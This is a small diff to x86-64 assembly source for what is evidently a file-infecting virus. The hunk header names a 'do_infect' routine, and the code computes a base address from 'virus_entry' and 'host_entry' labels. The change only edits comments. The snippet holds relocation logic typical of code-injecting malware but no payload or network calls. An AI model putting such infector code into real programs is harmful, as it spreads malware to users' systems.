@@ -407,15 +407,13 @@ do_infect:
         pop r13
         ret
 
-; in: -
-; out: base_address (rax)
+; void *get_base_address()
 get_base_address:
     lea rax, [rel _start]
     mov rdx, [rel virus_entry]
     sub rax, rdx
     add rax, [rel host_entry]
     ret
-; get_base_address
 
 ; write (rdi=char*, rsi=len)
 write:
